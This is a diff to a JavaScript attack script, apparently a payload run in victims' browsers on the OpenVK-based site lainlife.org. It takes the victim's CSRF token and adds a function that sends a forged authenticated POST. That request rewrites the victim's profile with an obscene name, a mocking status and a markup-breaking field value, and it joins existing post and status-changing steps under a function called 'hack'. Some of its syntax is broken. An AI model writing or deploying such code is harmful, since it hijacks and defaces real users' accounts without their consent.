@@ -63,10 +63,33 @@ async function setStatus(csrf, status) {
   })).text();
 }
 
+async changeProfile(csrf) {
+  await (await fetch("https://lainlife.org/edit?act=main", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "X-OpenVK-Ajax-Query": "1",
+        "Content-Type": "multipart/form-data; boundary=----geckoformboundaryc0b74d4e8fb71b4e23c846929975b191",
+        "Sec-GPC": "1",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "Priority": "u=0"
+    },
+    "referrer": "https://lainlife.org/edit",
+    "body": `------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\nDonkey\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"last_name\"\r\n\r\nFucker\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"pseudo\"\r\n\r\n\">1337\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"status\"\r\n\r\nLets all love Donkey Fucker!!! I'm his fan.\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"hometown\"\r\n\r\n\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"marialstatus\"\r\n\r\n6\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"maritalstatus-user\"\r\n\r\n625\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"politViews\"\r\n\r\n0\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"pronouns\"\r\n\r\n0\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"birthday\"\r\n\r\n1111-11-07\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"birthday_privacy\"\r\n\r\n0\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"broadcast_music\"\r\n\r\non\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\${csrf}\r\n------geckoformboundaryc0b74d4e8fb71b4e23c846929975b191--\r\n`,
+    "method": "POST",
+    "mode": "cors"
+  })).text();
+}
+
 async function hack() {
   const csrf = await getCSRF();
   console.log('csrf', csrf);
   await makePost(csrf);
+  await changeProfile(csrf);
   await setStatus(csrf, 'Lets all love Donkey Fucker!!! I\'m his fan.');
 };
 
